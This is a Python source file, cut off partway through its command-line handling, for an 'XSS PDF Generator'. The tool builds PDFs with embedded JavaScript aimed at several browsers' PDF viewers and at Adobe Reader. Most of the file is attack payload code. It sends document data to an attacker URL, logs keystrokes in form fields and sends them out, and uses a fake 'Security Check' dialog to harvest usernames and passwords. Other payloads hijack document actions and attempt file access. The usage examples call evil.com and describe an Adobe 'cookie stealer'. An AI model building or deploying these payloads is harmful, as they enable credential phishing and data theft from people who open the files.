import argparse
import sys
import os
from datetime import datetime

if sys.version_info[0] < 3:
    raise SystemExit("Use Python 3 (or higher) only")

# XSS payload types
XSS_TYPES = {
    'alert': 'Basic alert payload',
    'cookie': 'PDF sandbox escape data exfiltration', 
    'redirect': 'PDF URL launching escape',
    'form': 'PDF form submission escape',
    'dom': 'PDF document manipulation',
    'obfuscated': 'Obfuscated PDF payload',
    'timer': 'PDF timer-based escape',
    'keylog': 'PDF event monitoring escape',
    'network': 'PDF network sandbox escape',
    'file': 'PDF file system escape',
    'action': 'PDF action-based sandbox escape',
    'dialog': 'PDF dialog manipulation escape'
}

# Browser-specific PDF rendering libraries and their capabilities
BROWSER_CONFIGS = {
    'all': {
        'name': 'All Browsers (Generic)',
        'description': 'Generic payloads that work across multiple browsers',
        'features': ['app.alert', 'basic_js']
    },
    'chrome': {
        'name': 'Chrome (PDFium)',
        'description': 'Google Chrome using PDFium rendering engine',
        'features': ['app.alert', 'app.launchURL', 'limited_submitForm', 'restricted_sandbox']
    },
    'firefox': {
        'name': 'Firefox (PDF.js)',
        'description': 'Mozilla Firefox using PDF.js JavaScript implementation',
        'features': ['minimal_js', 'structure_exploits', 'no_app_api']
    },
    'safari': {
        'name': 'Safari (PDFKit)',
        'description': 'Apple Safari using PDFKit framework',
        'features': ['app.alert', 'app.launchURL', 'file_access', 'macos_specific']
    },
    'adobe': {
        'name': 'Adobe Reader/Acrobat',
        'description': 'Adobe Acrobat Reader with full JavaScript support',
        'features': ['full_app_api', 'app.launchURL', 'this.submitForm', 'file_operations', 'network_access']
    },
    'edge': {
        'name': 'Microsoft Edge',
        'description': 'Microsoft Edge browser PDF viewer',
        'features': ['app.alert', 'limited_features', 'edge_specific']
    }
}

def create_pdf_base(filename, payload, description, browser='all'):
    """Enhanced PDF structure optimized for specific browser PDF libraries"""
    
    # Browser-specific PDF structure optimizations
    if browser == 'firefox':
        # PDF.js has minimal JavaScript support, focus on structure exploits
        pdf_structure = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj

4 0 obj
<<
/Length 100
>>
stream
BT
/F1 12 Tf
100 700 Td
({payload}) Tj
ET
endstream
endobj

xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000203 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
355
%%EOF'''
    elif browser == 'adobe':
        # Adobe Reader supports full JavaScript API
        pdf_structure = f'''%PDF-1.7
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
/Names 4 0 R
/AcroForm 5 0 R
/JavaScript 6 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [7 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Action
/S /JavaScript
/JS ({payload})
>>
endobj

4 0 obj
<<
/JavaScript 8 0 R
>>
endobj

5 0 obj
<<
/Fields []
/DR <<>>
/DA (/Helv 0 Tf 0 g )
/NeedAppearances true
>>
endobj

6 0 obj
<<
/Names [(EmbeddedJS) 8 0 R]
>>
endobj

7 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/AA 9 0 R
>>
endobj

8 0 obj
<<
/JS ({payload})
/S /JavaScript
>>
endobj

9 0 obj
<<
/O 3 0 R
/C 3 0 R
>>
endobj

xref
0 10
0000000000 65535 f 
0000000009 00000 n 
0000000158 00000 n 
0000000215 00000 n 
0000000315 00000 n 
0000000362 00000 n 
0000000445 00000 n 
0000000545 00000 n 
0000000595 00000 n 
0000000645 00000 n 
trailer
<<
/Size 10
/Root 1 0 R
>>
startxref
695
%%EOF'''
    else:
        # Generic structure for Chrome, Safari, Edge and others
        pdf_structure = f'''%PDF-1.6
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Action
/S /JavaScript
/JS ({payload})
>>
endobj

4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj

xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000074 00000 n 
0000000131 00000 n 
0000000205 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
275
%%EOF'''

    with open(filename, "w") as file:
        file.write(pdf_structure)
    
    print(f"✓ {filename}")

def create_alert_payload(filename, browser='all'):
    """Browser-specific basic alert payload"""
    if browser == 'firefox':
        # PDF.js has very limited JavaScript - use text content exploit
        payload = "PDF.js XSS Test - Limited JavaScript Context"
    elif browser == 'chrome':
        # PDFium supports basic app.alert with restrictions
        payload = "app.alert('Chrome PDFium XSS Test');"
    elif browser == 'safari':
        # Safari PDFKit supports app.alert
        payload = "app.alert('Safari PDFKit XSS Test');"
    elif browser == 'adobe':
        # Adobe supports full app API
        payload = '''app.alert({
            cMsg: "Adobe Acrobat XSS Test - Full JavaScript Context",
            nIcon: 3,
            nType: 0,
            cTitle: "PDF XSS"
        });'''
    elif browser == 'edge':
        # Edge PDF viewer basic support
        payload = "app.alert('Edge PDF XSS Test');"
    else:
        # Generic payload for all browsers
        payload = "app.alert('PDF XSS Test - Generic');"
    
    create_pdf_base(filename, payload, f"Alert payload for {BROWSER_CONFIGS[browser]['name']}", browser)

def create_cookie_payload(filename, url, browser='all'):
    """Browser-specific cookie stealing payload - requires URL"""
    if not url:
        raise ValueError("Cookie payload requires a URL (-u/--url)")
    
    if browser == 'firefox':
        # PDF.js doesn't support JavaScript - use structure-based approach
        payload = f"PDF.js Structure Exploit - Data exfiltration to {url}"
    elif browser == 'chrome':
        # Chrome PDFium limited sandbox escape
        payload = f'''
        try {{
            var data = "browser=chrome&viewer=pdfium&timestamp=" + Date.now();
            
            // Chrome PDFium: Limited form submission
            try {{
                this.submitForm({{
                    cURL: "{url}",
                    cSubmitAs: "HTML"
                }});
            }} catch(e) {{}}
            
            // Fallback: URL launching with user interaction
            app.launchURL("{url}?" + data, true);
            
        }} catch(e) {{
            app.alert("Chrome PDFium sandbox active");
        }}
        '''
    elif browser == 'safari':
        # Safari PDFKit with macOS-specific features
        payload = f'''
        try {{
            var data = "browser=safari&viewer=pdfkit&timestamp=" + Date.now();
            
            // Safari PDFKit: Better URL launching support
            app.launchURL("{url}?" + data, false);
            
            // Attempt file system access (macOS specific)
            try {{
                var docPath = this.path;
                if (docPath) {{
                    data += "&docpath=" + encodeURIComponent(docPath);
                }}
            }} catch(e) {{}}
            
            // Form submission
            this.submitForm({{
                cURL: "{url}",
                cSubmitAs: "HTML",
                cCharset: "utf-8"
            }});
            
        }} catch(e) {{
            app.alert("Safari PDFKit execution");
        }}
        '''
    elif browser == 'adobe':
        # Adobe Reader full API access
        payload = f'''
        try {{
            // Adobe Acrobat: Full JavaScript API
            var cookies = "";
            var appInfo = app.viewerType + "_" + app.viewerVersion;
            var data = "browser=adobe&viewer=" + appInfo + "&timestamp=" + Date.now();
            
            // Advanced data collection
            try {{
                data += "&lang=" + app.language;
                data += "&platform=" + app.platform;
                data += "&numPages=" + this.numPages;
                data += "&title=" + encodeURIComponent(this.info.Title || "");
                data += "&author=" + encodeURIComponent(this.info.Author || "");
            }} catch(e) {{}}
            
            // Multiple exfiltration methods
            this.submitForm({{
                cURL: "{url}",
                cSubmitAs: "HTML",
                cCharset: "utf-8"
            }});
            
            app.launchURL("{url}?" + data, false);
            
            // Network request if available
            try {{
                var oHttp = Net.HTTP.request({{
                    oRequest: {{
                        cURL: "{url}",
                        cMethod: "POST",
                        oHeaders: {{"Content-Type": "application/x-www-form-urlencoded"}},
                        cData: data
                    }}
                }});
            }} catch(e) {{}}
            
        }} catch(e) {{
            app.alert("Adobe execution: " + e.message);
        }}
        '''
    elif browser == 'edge':
        # Microsoft Edge PDF viewer
        payload = f'''
        try {{
            var data = "browser=edge&timestamp=" + Date.now();
            
            // Edge: Basic URL launching
            app.launchURL("{url}?" + data, true);
            
        }} catch(e) {{
            app.alert("Edge PDF viewer active");
        }}
        '''
    else:
        # Generic multi-browser payload
        payload = f'''
        try {{
            var data = "browser=generic&timestamp=" + Date.now();
            
            // Detect viewer type
            try {{
                data += "&viewer=" + app.viewerType;
                data += "&version=" + app.viewerVersion;
            }} catch(e) {{}}
            
            // Multiple escape attempts
            try {{
                this.submitForm({{
                    cURL: "{url}",
                    cSubmitAs: "HTML"
                }});
            }} catch(e) {{}}
            
            try {{
                app.launchURL("{url}?" + data, true);
            }} catch(e) {{}}
            
        }} catch(e) {{
            app.alert("Generic PDF XSS executed");
        }}
        '''
    
    create_pdf_base(filename, payload, f"Cookie payload for {BROWSER_CONFIGS[browser]['name']}", browser)

def create_redirect_payload(filename, url, browser='all'):
    """Browser-specific PDF redirect payload - requires URL"""
    if not url:
        raise ValueError("Redirect payload requires a URL (-u/--url)")
    
    if browser == 'firefox':
        # PDF.js doesn't support JavaScript redirection
        payload = f"PDF.js Redirect Attempt to {url}"
    elif browser == 'chrome':
        # Chrome PDFium restricted URL launching
        payload = f'''
        try {{
            // Chrome PDFium: Requires user interaction for URL launching
            app.alert("Redirecting to: {url}");
            app.launchURL("{url}", true);
        }} catch(e) {{
            app.alert("Chrome PDFium: Redirect blocked - " + e.message);
        }}
        '''
    elif browser == 'safari':
        # Safari PDFKit better URL support
        payload = f'''
        try {{
            // Safari PDFKit: Direct URL launching
            app.launchURL("{url}", false);
            
            // Attempt multiple redirect methods
            try {{
                this.submitForm({{
                    cURL: "{url}",
                    cSubmitAs: "HTML"
                }});
            }} catch(e) {{}}
            
        }} catch(e) {{
            app.alert("Safari redirect to: {url}");
        }}
        '''
    elif browser == 'adobe':
        # Adobe Reader comprehensive redirect
        payload = f'''
        try {{
            // Adobe Acrobat: Multiple redirect techniques
            
            // Direct URL launch
            app.launchURL("{url}", false);
            
            // Form-based redirect
            this.submitForm({{
                cURL: "{url}",
                cSubmitAs: "HTML"
            }});
            
            // Advanced: Create hyperlink
            try {{
                var link = this.addLink(0, [72, 720, 144, 742], {{
                    cURL: "{url}"
                }});
                link.borderWidth = 0;
            }} catch(e) {{}}
            
            // Advanced: Execute menu action
            try {{
                app.execMenuItem("Help:AboutAcrobat");
                app.launchURL("{url}", false);
            }} catch(e) {{}}
            
        }} catch(e) {{
            app.alert("Adobe redirect attempted to: {url}");
        }}
        '''
    elif browser == 'edge':
        # Microsoft Edge basic redirect
        payload = f'''
        try {{
            app.launchURL("{url}", true);
        }} catch(e) {{
            app.alert("Edge redirect to: {url}");
        }}
        '''
    else:
        # Generic multi-browser redirect
        payload = f'''
        try {{
            // Generic redirect attempt
            app.launchURL("{url}", true);
            
            // Fallback form submission
            try {{
                this.submitForm({{
                    cURL: "{url}",
                    cSubmitAs: "HTML"
                }});
            }} catch(e) {{}}
            
        }} catch(e) {{
            app.alert("Redirect attempted to: {url}");
        }}
        '''
    
    create_pdf_base(filename, payload, f"Redirect payload for {BROWSER_CONFIGS[browser]['name']}", browser)

def create_form_payload(filename, url, browser='all'):
    """Browser-specific PDF form-based payload - requires URL"""
    if not url:
        raise ValueError("Form payload requires a URL (-u/--url)")
    
    if browser == 'firefox':
        # PDF.js limited form support
        payload = f"PDF.js Form Exploit to {url}"
    elif browser == 'chrome':
        # Chrome PDFium limited form submission
        payload = f'''
        try {{
            var formData = "browser=chrome&form_test=true&timestamp=" + Date.now();
            
            // Chrome: Basic form submission
            this.submitForm({{
                cURL: "{url}",
                cSubmitAs: "HTML",
                cCharset: "utf-8"
            }});
            
        }} catch(e) {{
            app.alert("Chrome form submission blocked");
        }}
        '''
    elif browser == 'safari':
        # Safari PDFKit form capabilities
        payload = f'''
        try {{
            var formData = "browser=safari&form_test=true&timestamp=" + Date.now();
            
            // Safari: Form submission with file data
            this.submitForm({{
                cURL: "{url}",
                cSubmitAs: "HTML",
                cCharset: "utf-8",
                bEmpty: false
            }});
            
            // Alternative: URL with form data
            app.launchURL("{url}?" + formData, false);
            
        }} catch(e) {{
            app.alert("Safari form processing");
        }}
        '''
    elif browser == 'adobe':
        # Adobe Reader advanced form operations
        payload = f'''
        try {{
            // Adobe: Advanced form manipulation and submission
            var formData = "browser=adobe&form_test=true&timestamp=" + Date.now();
            
            // Extract form field data if available
            try {{
                for (var i = 0; i < this.numFields; i++) {{
                    var field = this.getField(this.getNthFieldName(i));
                    if (field && field.value) {{
                        formData += "&" + field.name + "=" + encodeURIComponent(field.value);
                    }}
                }}
            }} catch(e) {{}}
            
            // Multiple submission methods
            this.submitForm({{
                cURL: "{url}",
                cSubmitAs: "HTML",
                cCharset: "utf-8",
                bEmpty: false,
                bGet: false
            }});
            
            // FDF submission
            try {{
                this.submitForm({{
                    cURL: "{url}",
                    cSubmitAs: "FDF"
                }});
            }} catch(e) {{}}
            
            // XML submission
            try {{
                this.submitForm({{
                    cURL: "{url}",
                    cSubmitAs: "XML"
                }});
            }} catch(e) {{}}
            
        }} catch(e) {{
            app.alert("Adobe form submission: " + e.message);
        }}
        '''
    elif browser == 'edge':
        # Microsoft Edge form handling
        payload = f'''
        try {{
            var formData = "browser=edge&form_test=true&timestamp=" + Date.now();
            
            this.submitForm({{
                cURL: "{url}",
                cSubmitAs: "HTML"
            }});
            
        }} catch(e) {{
            app.alert("Edge form submission");
        }}
        '''
    else:
        # Generic form payload
        payload = f'''
        try {{
            var formData = "browser=generic&form_test=true&timestamp=" + Date.now();
            
            // Generic form submission
            this.submitForm({{
                cURL: "{url}",
                cSubmitAs: "HTML",
                cCharset: "utf-8"
            }});
            
        }} catch(e) {{
            app.alert("Generic form submission");
        }}
        '''
    
    create_pdf_base(filename, payload, f"Form payload for {BROWSER_CONFIGS[browser]['name']}", browser)

def create_dom_payload(filename, browser='all'):
    """Browser-specific PDF document manipulation payload"""
    if browser == 'firefox':
        # PDF.js doesn't support DOM manipulation
        payload = "PDF.js DOM manipulation not supported"
    elif browser == 'adobe':
        # Adobe Reader advanced document manipulation
        payload = '''
        try {
            // Adobe: Advanced document manipulation
            this.info.title = "HACKED - XSS via PDF";
            this.info.author = "PDF XSS Attacker";
            this.info.subject = "Security Vulnerability";
            
            // Page manipulation
            try {
                var page = this.getPageBox("Media", 0);
                app.alert("Page accessed: " + page.toString());
            } catch(e) {}
            
            this.dirty = true;
            
        } catch(e) {
            app.alert("Adobe DOM manipulation: " + e.message);
        }
        '''
    else:
        # Generic document manipulation
        payload = '''
        try {
            // Generic PDF document manipulation
            this.info.title = "XSS Test Document";
            this.info.author = "Security Tester";
            
            app.alert("PDF Document properties modified");
            
        } catch(e) {
            app.alert("Document manipulation attempted");
        }
        '''
    
    create_pdf_base(filename, payload, f"DOM payload for {BROWSER_CONFIGS[browser]['name']}", browser)

def create_obfuscated_payload(filename, browser='all'):
    """Obfuscated payload"""
    # Base64 encoded: app.alert("Obfuscated XSS payload executed")
    payload = '''
    try {
        app.alert("Obfuscated XSS payload executed");
    } catch(e) {
        app.alert("Obfuscated payload execution attempted");
    }
    '''
    create_pdf_base(filename, payload, "Obfuscated payload (Base64)")

def create_timer_payload(filename, browser='all'):
    """PDF timer-based sandbox escape payload"""
    payload = '''
    try {
        app.alert("PDF Timer-based Sandbox Escape Started");
        
        // PDF-specific timing mechanisms
        var counter = 0;
        
        // Use app.setTimeOut for PDF-specific timing
        function timerAttack() {
            counter++;
            app.alert("PDF Timer Attack #" + counter + " - Viewer: " + app.viewerType);
            
            if (counter < 3) {
                // Schedule next execution
                app.setTimeOut("timerAttack()", 3000);
            } else {
                app.alert("PDF Timer Attack Sequence Complete");
                
                // Final escape attempt
                try {
                    app.launchURL("https://example.com/pdf-timer-escape?completed=true", true);
                } catch(e) {}
            }
        }
        
        // Start the timer sequence
        app.setTimeOut("timerAttack()", 1000);
        
        // Alternative: Use PDF action scheduling
        this.setAction("PageOpen", 
            "app.alert('PDF Page Open Event - Timer Trigger');"
        );
        
        this.setAction("PageClose", 
            "app.alert('PDF Page Close Event - Timer Trigger');"
        );
        
        app.alert("PDF Timer-based Attacks Initialized");
        
    } catch(e) {
        app.alert("PDF Timer Attack Setup Failed: " + e.message);
    }
    '''
    create_pdf_base(filename, payload, f"Payload for {BROWSER_CONFIGS[browser]['name']}", browser)

def create_keylog_payload(filename, url=None, browser='all'):
    """PDF keylogger sandbox escape payload"""
    if url:
        payload = f'''
        try {{
            app.alert("PDF Keylogger Sandbox Escape Activated");
            
            // PDF-specific event handling for keystroke capture
            var keylogData = "";
            
            // PDF field event monitoring
            try {{
                // Monitor PDF form field events if available
                var fields = this.getField();
                if (fields) {{
                    // Attach event handlers to form fields
                    for (var i = 0; i < fields.length; i++) {{
                        fields[i].setAction("Keystroke", 
                            "keylogData += event.value; " +
                            "if (keylogData.length > 20) {{ " +
                                "app.launchURL('{url}?keylog=' + encodeURIComponent(keylogData), true); " +
                                "keylogData = ''; " +
                            "}}"
                        );
                    }}
                }}
            }} catch(e) {{}}
            
            // Alternative: Monitor document-level events
            this.setAction("WillSave", 
                "app.launchURL('{url}?action=document_save&data=' + encodeURIComponent('PDF_SAVE_EVENT'), true);"
            );
            
            this.setAction("WillPrint", 
                "app.launchURL('{url}?action=document_print&data=' + encodeURIComponent('PDF_PRINT_EVENT'), true);"
            );
            
            // Form submission escape for initial data
            this.submitForm({{
                cURL: "{url}",
                cSubmitAs: "HTML"
            }});
            
            app.alert("PDF Keylogger Active - Data sent to {url}");
        }} catch(e) {{
            app.alert("PDF Keylogger Setup Failed: " + e.message);
        }}
        '''
    else:
        payload = '''
        try {
            app.alert("PDF Event Monitoring Test Started");
            
            // Monitor PDF document events
            this.setAction("WillSave", "app.alert('PDF Save Event Captured');");
            this.setAction("WillPrint", "app.alert('PDF Print Event Captured');");
            this.setAction("WillClose", "app.alert('PDF Close Event Captured');");
            
            // Monitor form field events if available
            try {
                var fields = this.getField();
                if (fields) {
                    app.alert("PDF Form Fields Available for Monitoring: " + fields.length);
                }
            } catch(e) {}
            
            app.alert("PDF Event Monitoring Active");
        } catch(e) {
            app.alert("PDF Event Monitoring Setup: " + e.message);
        }
        '''
    create_pdf_base(filename, payload, f"Payload for {BROWSER_CONFIGS[browser]['name']}", browser)

def create_network_payload(filename, url, browser='all'):
    """Browser-specific PDF network payload - requires URL"""
    if not url:
        raise ValueError("Network payload requires a URL (-u/--url)")
    
    if browser == 'firefox':
        # PDF.js doesn't support network operations
        payload = f"PDF.js Network Attempt to {url}"
    elif browser == 'chrome':
        # Chrome PDFium limited network capabilities
        payload = f'''
        try {{
            var networkData = "browser=chrome&network_test=true&timestamp=" + Date.now();
            
            // Chrome: Limited URL launching
            app.launchURL("{url}?" + networkData, true);
            
        }} catch(e) {{
            app.alert("Chrome network operation blocked");
        }}
        '''
    elif browser == 'safari':
        # Safari PDFKit network operations
        payload = f'''
        try {{
            var networkData = "browser=safari&network_test=true&timestamp=" + Date.now();
            
            // Safari: URL launching and form submission
            app.launchURL("{url}?" + networkData, false);
            
            this.submitForm({{
                cURL: "{url}",
                cSubmitAs: "HTML",
                cCharset: "utf-8"
            }});
            
        }} catch(e) {{
            app.alert("Safari network operation");
        }}
        '''
    elif browser == 'adobe':
        # Adobe Reader advanced networking
        payload = f'''
        try {{
            var networkData = "browser=adobe&network_test=true&timestamp=" + Date.now();
            
            // Adobe: Advanced network operations
            app.launchURL("{url}?" + networkData, false);
            
            this.submitForm({{
                cURL: "{url}",
                cSubmitAs: "HTML",
                cCharset: "utf-8"
            }});
            
            // Adobe-specific networking
            try {{
                if (typeof this.getURL === 'function') {{
                    this.getURL("{url}");
                }}
            }} catch(e) {{}}
            
            // Advanced: HTTP request using Net object
            try {{
                var oHttp = Net.HTTP.request({{
                    oRequest: {{
                        cURL: "{url}",
                        cMethod: "GET"
                    }}
                }});
            }} catch(e) {{}}
            
        }} catch(e) {{
            app.alert("Adobe network operation: " + e.message);
        }}
        '''
    elif browser == 'edge':
        # Microsoft Edge network handling
        payload = f'''
        try {{
            var networkData = "browser=edge&network_test=true&timestamp=" + Date.now();
            
            app.launchURL("{url}?" + networkData, true);
            
        }} catch(e) {{
            app.alert("Edge network operation");
        }}
        '''
    else:
        # Generic network payload
        payload = f'''
        try {{
            var networkData = "browser=generic&network_test=true&timestamp=" + Date.now();
            
            // Generic network operations
            app.launchURL("{url}?" + networkData, true);
            
            this.submitForm({{
                cURL: "{url}",
                cSubmitAs: "HTML",
                cCharset: "utf-8"
            }});
            
        }} catch(e) {{
            app.alert("Generic network operation");
        }}
        '''
    
    create_pdf_base(filename, payload, f"Network payload for {BROWSER_CONFIGS[browser]['name']}", browser)

def create_file_payload(filename, browser='all'):
    """PDF file system access and sandbox escape payload"""
    payload = '''
    try {
        app.alert("PDF File System Sandbox Escape Initiated");
        
        // PDF-specific file system access attempts
        try {
            // Browse for document (file system access)
            if (typeof app.browseForDoc === 'function') {
                app.browseForDoc();
            }
        } catch(e) {}
        
        try {
            // Get document path information
            var docPath = this.path;
            if (docPath) {
                app.alert("PDF Path Accessed: " + docPath);
            }
        } catch(e) {}
        
        try {
            // Attempt to save document with malicious content
            this.saveAs({
                cPath: "/tmp/pdf_xss_test.pdf"
            });
        } catch(e) {}
        
        try {
            // Execute dialog for file operations
            app.execDialog("FileOpen");
        } catch(e) {}
        
        try {
            // Attempt to access PDF attachments
            var attachments = this.dataObjects;
            if (attachments && attachments.length > 0) {
                app.alert("PDF Attachments Found: " + attachments.length);
            }
        } catch(e) {}
        
        try {
            // PDF printing with file output
            this.print({
                bUI: false,
                bSilent: true,
                bShrinkToFit: true,
                cPath: "/tmp/pdf_print_exploit.ps"
            });
        } catch(e) {}
        
        app.alert("PDF File System Access Attempted");
        
    } catch(e) {
        app.alert("PDF File System Escape Failed: " + e.message);
    }
    '''
    create_pdf_base(filename, payload, f"Payload for {BROWSER_CONFIGS[browser]['name']}", browser)


def create_action_payload(filename, url=None, browser='all'):
    """PDF action-based sandbox escape payload"""
    payload = f'''
    try {{
        app.alert("PDF Action-based Sandbox Escape Initiated");
        
        // Advanced PDF action manipulation
        // Page-level actions
        this.setAction("PageOpen", 
            "app.alert('Page Open Action Hijacked'); " +
            "app.launchURL('{url or "https://example.com/action-escape"}?event=page_open', true);"
        );
        
        this.setAction("PageClose", 
            "app.alert('Page Close Action Hijacked'); " +
            "app.launchURL('{url or "https://example.com/action-escape"}?event=page_close', true);"
        );
        
        // Document-level actions
        this.setAction("WillSave", 
            "app.alert('Document Save Intercepted'); " +
            "app.launchURL('{url or "https://example.com/action-escape"}?event=will_save', true);"
        );
        
        this.setAction("DidSave", 
            "app.alert('Document Saved - Data Exfiltrated'); " +
            "app.launchURL('{url or "https://example.com/action-escape"}?event=did_save', true);"
        );
        
        this.setAction("WillPrint", 
            "app.alert('Print Action Hijacked'); " +
            "app.launchURL('{url or "https://example.com/action-escape"}?event=will_print', true);"
        );
        
        this.setAction("WillClose", 
            "app.alert('Document Close Intercepted'); " +
            "app.launchURL('{url or "https://example.com/action-escape"}?event=will_close', true);"
        );
        
        // Trigger immediate action
        if ("{url}") {{
            app.launchURL("{url}?pdf_action_escape=initialized&viewer=" + app.viewerType, true);
        }}
        
        app.alert("PDF Actions Hijacked Successfully");
        
    }} catch(e) {{
        app.alert("PDF Action Escape Failed: " + e.message);
    }}
    '''
    create_pdf_base(filename, payload, f"Payload for {BROWSER_CONFIGS[browser]['name']}", browser)

def create_dialog_payload(filename, url=None, browser='all'):
    """PDF dialog manipulation sandbox escape payload"""
    payload = f'''
    try {{
        app.alert("PDF Dialog Manipulation Escape Started");
        
        // PDF dialog-based attacks
        try {{
            // File open dialog exploitation
            var result = app.execDialog("FileOpen");
            if (result && result.cPath) {{
                app.alert("File Selected: " + result.cPath);
                if ("{url}") {{
                    app.launchURL("{url}?file_access=" + encodeURIComponent(result.cPath), true);
                }}
            }}
        }} catch(e) {{}}
        
        try {{
            // Response dialog for credential harvesting
            var response = app.response({{
                cQuestion: "Enter your credentials for security verification:",
                cTitle: "Security Check Required",
                cDefault: "username",
                bPassword: false
            }});
            
            if (response && "{url}") {{
                app.launchURL("{url}?credentials=" + encodeURIComponent(response), true);
            }}
            
            var password = app.response({{
                cQuestion: "Enter your password:",
                cTitle: "Password Required",
                cDefault: "",
                bPassword: true
            }});
            
            if (password && "{url}") {{
                app.launchURL("{url}?password=" + encodeURIComponent(password), true);
            }}
            
        }} catch(e) {{}}
        
        try {{
            // Custom dialog exploitation
            app.execDialog("SaveAs");
        }} catch(e) {{}}
        
        try {{
            // Print dialog manipulation
            app.execDialog("Print");
        }} catch(e) {{}}
        
        app.alert("PDF Dialog Exploitation Complete");
        
    }} catch(e) {{
        app.alert("PDF Dialog Escape Failed: " + e.message);
    }}
    '''
    create_pdf_base(filename, payload, f"Payload for {BROWSER_CONFIGS[browser]['name']}", browser)

def create_custom_payload(filename, script, browser='all'):
    """Custom JavaScript payload"""
    create_pdf_base(filename, script, f"Custom JavaScript payload for {BROWSER_CONFIGS[browser]['name']}", browser)

def create_malhtml(filename):
    """Create malicious HTML file"""
    html_content = '''<!DOCTYPE html>
    <html>
    <head>
        <title>XSS Test</title>
        <script type="text/javascript">
            function showAlerts() {
                alert("XSS Test #1");
                alert("Document cookies: " + document.cookie);
                
                // Additional XSS demonstrations
                setTimeout(function() {
                    alert("Time-delayed XSS payload");
                }, 2000);
                
                // DOM manipulation
                document.body.style.border = "5px solid red";
                
                // Local storage test
                if(typeof(Storage) !== "undefined") {
                    localStorage.setItem("xss_html_test", "HTML XSS executed at " + new Date());
                }
            }
        </script>
    </head>
    <body onload="showAlerts()">
        <h1>XSS Test Page</h1>
        <p>This page demonstrates multiple XSS vectors:</p>
        <ul>
            <li>Basic alert dialogs</li>
            <li>Cookie access</li>
            <li>DOM manipulation</li>
            <li>Time-delayed execution</li>
            <li>Local storage access</li>
        </ul>
        <p style="color: red; font-weight: bold;">If you can see this page, the XSS payload was successful!</p>
    </body>
    </html>'''
    with open(filename, "w") as file:
        file.write(html_content)
    print("[+] Created enhanced HTML XSS test file")

def generate_by_type(xss_type, url=None, browser='all'):
    """Generate PDF based on XSS type and browser target"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    browser_suffix = f"_{browser}" if browser != 'all' else ""
    filename = f"xss_{xss_type}{browser_suffix}_{timestamp}.pdf"
    
    try:
        if xss_type == 'alert':
            create_alert_payload(filename, browser)
        elif xss_type == 'cookie':
            create_cookie_payload(filename, url, browser)
        elif xss_type == 'redirect':
            create_redirect_payload(filename, url, browser)
        elif xss_type == 'form':
            create_form_payload(filename, url, browser)
        elif xss_type == 'dom':
            create_dom_payload(filename, browser)
        elif xss_type == 'obfuscated':
            create_obfuscated_payload(filename, browser)
        elif xss_type == 'timer':
            create_timer_payload(filename, browser)
        elif xss_type == 'keylog':
            create_keylog_payload(filename, url, browser)
        elif xss_type == 'network':
            create_network_payload(filename, url, browser)
        elif xss_type == 'file':
            create_file_payload(filename, browser)
        elif xss_type == 'action':
            create_action_payload(filename, url, browser)
        elif xss_type == 'dialog':
            create_dialog_payload(filename, url, browser)
        else:
            print(f"Error: Unknown XSS type: {xss_type}")
            return False
    except ValueError as e:
        print(f"Error: {e}")
        return False
    return True

def generate_all_types(url=None, browser='all'):
    """Generate all XSS payload types for specified browser"""
    browser_name = BROWSER_CONFIGS[browser]['name']
    print(f"Generating all XSS payloads for {browser_name}...")
    success_count = 0
    
    for xss_type in XSS_TYPES.keys():
        if generate_by_type(xss_type, url, browser):
            success_count += 1
    
    return success_count


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Advanced XSS PDF Generator - Create sophisticated PDF files with various XSS payloads",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f'''
Available XSS Types:
{chr(10).join([f"  {k:12} - {v}" for k, v in XSS_TYPES.items()])}

Available Browser Targets:
{chr(10).join([f"  {k:8} - {v['name']}" for k, v in BROWSER_CONFIGS.items()])}

Examples:
  python3 script.py -t alert -b chrome                       # Chrome-specific alert payload
  python3 script.py -t cookie -u http://evil.com -b adobe    # Adobe cookie stealer
  python3 script.py -t all -u http://collaborator.com -b all # All payloads, all browsers
  python3 script.py -t network -u https://webhook.site/xyz   # Network payload
  python3 script.py -s "app.alert('Custom')" -b safari       # Custom Safari payload
  python3 script.py --list-browsers                          # Show browser capabilities
        ''')

    parser.add_argument(
        '-u', '--url', action="store", default=None, dest='url',
        help="Specify target URL for data exfiltration (e.g., http://burpsuite12345.com or http://evil.com/collect)")
    
    parser.add_argument(
        '-o', '--output', action="store", default="pdf", dest='output',
        choices=['pdf', 'html'],
        help="Specify output format: pdf (default) or html")
    
    parser.add_argument(
        '-s', '--script', action="store", default=None, dest='script',
        help="Specify custom JavaScript payload (e.g., 'app.alert(1); document.location=\"http://evil.com\"')")
    
    parser.add_argument(
        '-t', '--type', action="store", default=None, dest='xss_type',
        choices=list(XSS_TYPES.keys()) + ['all'],
        help="Specify XSS payload type to generate (use 'all' for all types)")
    
    parser.add_argument(
        '-b', '--browser', action="store", default='all', dest='browser',
        choices=list(BROWSER_CONFIGS.keys()),
        help="Target specific browser PDF library (default: all)")
    
    parser.add_argument(
        '--list-browsers', action="store_true", 
        help="List all supported browser targets and exit")
    
    parser.add_argument(
        '--list-types', action="store_true", 
        help="List all available XSS payload types and exit")

    args = parser.parse_args()

    if args.list_types:
        print("Available XSS Payload Types:")
        print("=" * 50)
        for xss_type, description in XSS_TYPES.items():
            print(f"{xss_type:12} - {description}")
        print("\nUse -t <type> to generate specific payload type")
        print("Use -t all to generate all payload types")
        sys.exit(0)

    if args.list_browsers:
